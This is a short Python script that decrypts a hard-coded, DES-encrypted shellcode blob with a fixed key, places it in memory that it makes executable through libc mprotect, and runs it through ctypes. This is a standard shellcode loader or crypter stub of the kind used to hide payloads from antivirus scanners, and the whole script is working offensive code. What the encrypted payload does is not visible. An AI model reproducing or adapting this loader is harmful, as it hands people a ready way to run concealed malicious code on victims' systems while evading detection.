#!/bin/python

from Crypto.Cipher import DES
import socket
import sys
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import os


encrypted_data = "\x9a\xa9\x7d\x8b\xc4\x0f\x1a\xca\xeb\x74\xae\x62\x66\x51\x01\xdd\xc2\x77\x52\xc5\x55\xb9\xdf\xe9\xb0\xbe\xff\xca\x98\x45\xc1\x9a"
cipher = DES.new("aaaaaaaa")


shellcode = cipher.decrypt(encrypted_data)



libc = CDLL('libc.so.6')
#shellcode = shellcode.replace('\\x','').decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
